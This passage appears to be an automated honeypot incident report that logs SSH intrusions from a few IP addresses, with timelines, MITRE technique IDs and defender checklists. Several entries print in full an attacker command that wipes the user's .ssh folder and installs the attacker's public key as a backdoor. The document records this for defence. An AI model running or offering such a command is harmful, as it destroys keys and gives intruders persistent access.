| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:41:22` | `cowrie.session.connect` |
| `2026-05-24 19:41:22` | `cowrie.client.version` |
| `2026-05-24 19:41:22` | `cowrie.client.kex` |
| `2026-05-24 19:41:23` | `cowrie.login.success` |
| `2026-05-24 19:41:23` | `cowrie.session.params` |
| `2026-05-24 19:41:23` | `cowrie.command.input` |
| `2026-05-24 19:41:23` | `cowrie.command.failed` |
| `2026-05-24 19:41:24` | `cowrie.log.closed` |
| `2026-05-24 19:41:24` | `cowrie.session.params` |
| `2026-05-24 19:41:24` | `cowrie.command.input` |
| `2026-05-24 19:41:24` | `cowrie.session.file_download` |
| `2026-05-24 19:41:24` | `cowrie.log.closed` |
| `2026-05-24 19:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83201ebfaac2

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:41 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:41:27` | `cowrie.session.connect` |
| `2026-05-24 19:41:27` | `cowrie.client.version` |
| `2026-05-24 19:41:27` | `cowrie.client.kex` |
| `2026-05-24 19:41:28` | `cowrie.login.success` |
| `2026-05-24 19:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31519bc1641b

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:41 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:41:35` | `cowrie.session.connect` |
| `2026-05-24 19:41:35` | `cowrie.client.version` |
| `2026-05-24 19:41:35` | `cowrie.client.kex` |
| `2026-05-24 19:41:36` | `cowrie.login.success` |
| `2026-05-24 19:41:37` | `cowrie.session.params` |
| `2026-05-24 19:41:37` | `cowrie.command.input` |
| `2026-05-24 19:41:37` | `cowrie.command.failed` |
| `2026-05-24 19:41:37` | `cowrie.log.closed` |
| `2026-05-24 19:41:37` | `cowrie.session.params` |
| `2026-05-24 19:41:37` | `cowrie.command.input` |
| `2026-05-24 19:41:37` | `cowrie.session.file_download` |
| `2026-05-24 19:41:37` | `cowrie.log.closed` |
| `2026-05-24 19:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adb9ad8a230

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:41 |
| **Last Seen** | 2026-05-24 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:41:40` | `cowrie.session.connect` |
| `2026-05-24 19:41:40` | `cowrie.client.version` |
| `2026-05-24 19:41:40` | `cowrie.client.kex` |
| `2026-05-24 19:41:41` | `cowrie.login.success` |
| `2026-05-24 19:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7cccabfc7a1

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:42 |
| **Last Seen** | 2026-05-24 19:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:42:01` | `cowrie.session.connect` |
| `2026-05-24 19:42:01` | `cowrie.client.version` |
| `2026-05-24 19:42:02` | `cowrie.client.kex` |
| `2026-05-24 19:42:02` | `cowrie.login.success` |
| `2026-05-24 19:42:03` | `cowrie.session.params` |
| `2026-05-24 19:42:03` | `cowrie.command.input` |
| `2026-05-24 19:42:03` | `cowrie.command.failed` |
| `2026-05-24 19:42:03` | `cowrie.log.closed` |
| `2026-05-24 19:42:03` | `cowrie.session.params` |
| `2026-05-24 19:42:03` | `cowrie.command.input` |
| `2026-05-24 19:42:04` | `cowrie.session.file_download` |
| `2026-05-24 19:42:04` | `cowrie.log.closed` |
| `2026-05-24 19:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fdc5601b4d6

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:42 |
| **Last Seen** | 2026-05-24 19:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:42:06` | `cowrie.session.connect` |
| `2026-05-24 19:42:06` | `cowrie.client.version` |
| `2026-05-24 19:42:06` | `cowrie.client.kex` |
| `2026-05-24 19:42:07` | `cowrie.login.success` |
| `2026-05-24 19:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030396618ffe

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:42 |
| **Last Seen** | 2026-05-24 19:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:42:16` | `cowrie.session.connect` |
| `2026-05-24 19:42:16` | `cowrie.client.version` |
| `2026-05-24 19:42:16` | `cowrie.client.kex` |
| `2026-05-24 19:42:17` | `cowrie.login.success` |
| `2026-05-24 19:42:18` | `cowrie.session.params` |
| `2026-05-24 19:42:18` | `cowrie.command.input` |
| `2026-05-24 19:42:18` | `cowrie.command.failed` |
| `2026-05-24 19:42:18` | `cowrie.log.closed` |
| `2026-05-24 19:42:18` | `cowrie.session.params` |
| `2026-05-24 19:42:18` | `cowrie.command.input` |
| `2026-05-24 19:42:18` | `cowrie.session.file_download` |
| `2026-05-24 19:42:18` | `cowrie.log.closed` |
| `2026-05-24 19:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb50550cd381

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:42 |
| **Last Seen** | 2026-05-24 19:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:42:21` | `cowrie.session.connect` |
| `2026-05-24 19:42:21` | `cowrie.client.version` |
| `2026-05-24 19:42:21` | `cowrie.client.kex` |
| `2026-05-24 19:42:22` | `cowrie.login.success` |
| `2026-05-24 19:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df78c8e2bb3

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:42 |
| **Last Seen** | 2026-05-24 19:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:42:54` | `cowrie.session.connect` |
| `2026-05-24 19:42:54` | `cowrie.client.version` |
| `2026-05-24 19:42:54` | `cowrie.client.kex` |
| `2026-05-24 19:42:55` | `cowrie.login.success` |
| `2026-05-24 19:42:55` | `cowrie.session.params` |
| `2026-05-24 19:42:55` | `cowrie.command.input` |
| `2026-05-24 19:42:55` | `cowrie.command.failed` |
| `2026-05-24 19:42:55` | `cowrie.log.closed` |
| `2026-05-24 19:42:56` | `cowrie.session.params` |
| `2026-05-24 19:42:56` | `cowrie.command.input` |
| `2026-05-24 19:42:56` | `cowrie.session.file_download` |
| `2026-05-24 19:42:56` | `cowrie.log.closed` |
| `2026-05-24 19:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8752fe46d5f6

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:42 |
| **Last Seen** | 2026-05-24 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:42:58` | `cowrie.session.connect` |
| `2026-05-24 19:42:58` | `cowrie.client.version` |
| `2026-05-24 19:42:59` | `cowrie.client.kex` |
| `2026-05-24 19:42:59` | `cowrie.login.success` |
| `2026-05-24 19:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b096defd3f

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:43 |
| **Last Seen** | 2026-05-24 19:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:43:20` | `cowrie.session.connect` |
| `2026-05-24 19:43:20` | `cowrie.client.version` |
| `2026-05-24 19:43:21` | `cowrie.client.kex` |
| `2026-05-24 19:43:22` | `cowrie.login.success` |
| `2026-05-24 19:43:22` | `cowrie.session.params` |
| `2026-05-24 19:43:22` | `cowrie.command.input` |
| `2026-05-24 19:43:22` | `cowrie.command.failed` |
| `2026-05-24 19:43:22` | `cowrie.log.closed` |
| `2026-05-24 19:43:23` | `cowrie.session.params` |
| `2026-05-24 19:43:23` | `cowrie.command.input` |
| `2026-05-24 19:43:23` | `cowrie.session.file_download` |
| `2026-05-24 19:43:23` | `cowrie.log.closed` |
| `2026-05-24 19:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea13360eaee8

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]72` |
| **First Seen** | 2026-05-24 19:43 |
| **Last Seen** | 2026-05-24 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:43:25` | `cowrie.session.connect` |
| `2026-05-24 19:43:25` | `cowrie.client.version` |
| `2026-05-24 19:43:25` | `cowrie.client.kex` |
| `2026-05-24 19:43:26` | `cowrie.login.success` |
| `2026-05-24 19:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]72` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2c4c732627

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 19:49 |
| **Last Seen** | 2026-05-24 19:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:49:23` | `cowrie.session.connect` |
| `2026-05-24 19:49:23` | `cowrie.client.version` |
| `2026-05-24 19:49:24` | `cowrie.client.kex` |
| `2026-05-24 19:49:25` | `cowrie.login.success` |
| `2026-05-24 19:49:26` | `cowrie.session.params` |
| `2026-05-24 19:49:26` | `cowrie.command.input` |
| `2026-05-24 19:49:26` | `cowrie.command.failed` |
| `2026-05-24 19:49:26` | `cowrie.log.closed` |
| `2026-05-24 19:49:27` | `cowrie.session.params` |
| `2026-05-24 19:49:27` | `cowrie.command.input` |
| `2026-05-24 19:49:27` | `cowrie.session.file_download` |
| `2026-05-24 19:49:27` | `cowrie.log.closed` |
| `2026-05-24 19:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8d29ac3a37f

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 19:49 |
| **Last Seen** | 2026-05-24 19:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:49:31` | `cowrie.session.connect` |
| `2026-05-24 19:49:31` | `cowrie.client.version` |
| `2026-05-24 19:49:31` | `cowrie.client.kex` |
| `2026-05-24 19:49:33` | `cowrie.login.success` |
| `2026-05-24 19:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09e45e8331fa

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:02 |
| **Last Seen** | 2026-05-24 20:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:02:53` | `cowrie.session.connect` |
| `2026-05-24 20:02:53` | `cowrie.client.version` |
| `2026-05-24 20:02:54` | `cowrie.client.kex` |
| `2026-05-24 20:02:55` | `cowrie.login.success` |
| `2026-05-24 20:02:56` | `cowrie.session.params` |
| `2026-05-24 20:02:56` | `cowrie.command.input` |
| `2026-05-24 20:02:56` | `cowrie.command.failed` |
| `2026-05-24 20:02:56` | `cowrie.log.closed` |
| `2026-05-24 20:02:57` | `cowrie.session.params` |
| `2026-05-24 20:02:57` | `cowrie.command.input` |
| `2026-05-24 20:02:57` | `cowrie.session.file_download` |
| `2026-05-24 20:02:57` | `cowrie.log.closed` |
| `2026-05-24 20:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7accbdae40

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:03 |
| **Last Seen** | 2026-05-24 20:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:03:01` | `cowrie.session.connect` |
| `2026-05-24 20:03:01` | `cowrie.client.version` |
| `2026-05-24 20:03:01` | `cowrie.client.kex` |
| `2026-05-24 20:03:03` | `cowrie.login.success` |
| `2026-05-24 20:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21433df9f51d

| Field | Detail |
|---|---|
| **Source IP** | `138.113.28[.]120` |
| **First Seen** | 2026-05-24 20:05 |
| **Last Seen** | 2026-05-24 20:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:05:24` | `cowrie.session.connect` |
| `2026-05-24 20:05:24` | `cowrie.client.version` |
| `2026-05-24 20:05:24` | `cowrie.client.kex` |
| `2026-05-24 20:05:25` | `cowrie.login.success` |
| `2026-05-24 20:05:25` | `cowrie.session.params` |
| `2026-05-24 20:05:25` | `cowrie.command.input` |
